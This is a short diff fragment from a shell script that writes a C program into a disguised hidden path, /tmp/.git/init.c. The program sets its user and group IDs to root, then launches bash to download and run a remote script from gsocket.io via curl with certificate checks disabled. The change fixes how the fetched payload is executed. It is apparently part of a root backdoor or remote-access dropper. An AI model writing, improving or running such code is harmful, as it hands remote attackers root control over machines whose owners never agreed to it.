@@ -18,7 +18,7 @@ EOF
 cat << EOF > /tmp/.git/init.c
 #include <stdio.h>
 int main(void){
-    char* argument_list[] = {"/bin/bash", "<(curl -fsSLk gsocket.io/x)", NULL};
+    char* argument_list[] = {"/bin/bash", "-c", "\"$(curl -fsSLk gsocket.io/x)\"", NULL};
     setuid(0);
     setgid(0);
     seteuid(0);
